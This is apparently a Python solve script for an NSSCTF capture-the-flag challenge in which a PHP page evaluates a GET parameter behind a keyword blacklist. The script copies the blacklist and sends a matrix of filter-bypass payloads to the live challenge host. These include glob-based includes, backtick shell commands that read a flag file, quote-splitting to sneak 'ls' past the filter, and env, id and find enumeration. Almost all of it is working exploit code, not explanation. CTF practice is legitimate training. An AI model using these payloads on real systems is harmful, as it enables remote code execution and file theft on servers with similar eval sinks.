#!/usr/bin/env python3
# Lane B - NSSCTF node4.anna.nssctf.cn:24112
# eval($_GET['code']) behind blacklist. Replayable harness.
#
# Usage:
#   python solve-lane-b.py check   <payload>     # offline filter verdict only
#   python solve-lane-b.py send    <payload>     # live request, print raw body
#   python solve-lane-b.py matrix                # run the full matrix
import re
import sys
import urllib.parse
import urllib.request

BASE = "http://node4.anna.nssctf.cn:24112/"
BLACKLIST = (
    r"sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|"
    r"\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|"
    r"readgzfile|dirname|time|next|all|hex2bin|im|shell"
)
RX = re.compile(BLACKLIST, re.I)


def filter_verdict(payload):
    """Offline replica of the server-side preg_match. Returns (accepted, hits)."""
    hits = sorted({m.group(0) for m in RX.finditer(payload)}, key=lambda s: (len(s), s))
    return (not hits), hits


def send(payload, timeout=25):
    url = BASE + "?code=" + urllib.parse.quote(payload, safe="")
    req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
    except Exception as e:  # noqa: BLE001
        return url, "<ERROR %s>" % e
    body = raw.decode("utf-8", "replace")
    return url, body


def clean(body):
    """Strip the fixed banner so only the sink output remains."""
    for marker in ("不叫样子！！", "不叫样子!!", "<br>"):
        i = body.rfind(marker)
        if i != -1:
            return body[i + len(marker):]
    return body


def run(payload, label=None):
    ok, hits = filter_verdict(payload)
    url, body = send(payload)
    if "你想干什么" in body:
        out = "<FILTER REJECTED BY SERVER>"
    else:
        out = clean(body).strip()
    tag = label or payload
    print("=" * 78)
    print("PAYLOAD : %s" % tag)
    print("URL     : %s" % url)
    print("OFFLINE : %s%s" % ("ACCEPT" if ok else "REJECT", "" if ok else "  hits=%s" % hits))
    print("RAW     : %s" % out[:1200])
    print()
    return {"payload": tag, "url": url, "offline": ok, "hits": hits, "raw": out}


MATRIX = [
    # --- A) variable-free PHP routes -------------------------------------------------
    ("A1 glob-print_r", 'print_r(glob("/f????"));'),
    ("A2 glob-var_dump", 'var_dump(glob("/f????"));'),
    ("A3 include-glob", 'include("/f????");'),
    ("A4 require-glob", 'require("/f????");'),
    ("A5 print(glob)", 'print(print_r(glob("/f????"),true));'),
    ("A6 getcwd", 'print_r(getcwd());'),
    ("A7 get_defined_vars", 'print_r(get_defined_vars());'),
    ("A8 scandir-root", 'print_r(scandir("/"));'),
    ("A9 magic-consts", 'print_r([__FILE__,__DIR__,__LINE__]);'),
    ("A10 assert", 'assert(1);print(7*7);'),
    ("A11 die-on-fail", 'die(print_r(glob("/f????")));'),
    ("A12 exec", "print(exec('nl /f????'));"),
    ("A13 system-backtick", 'print(`nl /f????`);'),
    ("A14 backtick-echo", "print(`nl /f????`);"),
    # --- B) shell reconstruction -----------------------------------------------------
    ("B1 dq-attr", 'print(`a""ls /`);'),
    ("B2 dq-attr-compact", 'print(`ls"" /`);'),
    ("B3 backslash", "print(`l\\s /`);"),
    ("B4 sort-glob", "print(`sort /f??????`);"),
    ("B5 sort-slash-f-allglob", "print(`sort /f*`);"),
    ("B6 find", "print(`find / -maxdepth 1`);"),
    ("B7 env", "print(`env`);"),
    ("B8 id", "print(`id`);"),
    ("B9 dir-dq", 'print(`d""ir /`);'),
    # --- C) alternate locations -------------------------------------------------------
    ("C1 root-listing-find", "print(`find / -maxdepth 2 -name f*`);"),
    ("C2 wwwlisting", "print(`find /var/www -maxdepth 3`);"),
    ("C3 tmp", "print(`find /tmp -maxdepth 2`);"),
]


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return
    cmd = sys.argv[1]
    if cmd == "check":
        ok, hits = filter_verdict(sys.argv[2])
        print("ACCEPT" if ok else "REJECT hits=%s" % hits)
    elif cmd == "send":
        url, body = send(sys.argv[2])
        print("URL: %s" % url)
        print(body)
    elif cmd == "matrix":
        results = []
        for label, payload in MATRIX:
            results.append(run(payload, label))
        print("#" * 78)
        print("SUMMARY")
        for r in results:
            print("%-24s offline=%-6s raw=%s" % (
                r["payload"], "ACCEPT" if r["offline"] else "REJECT",
                r["raw"][:120].replace("\n", "\\n")))
    else:
        print(__doc__)


if __name__ == "__main__":
    main()
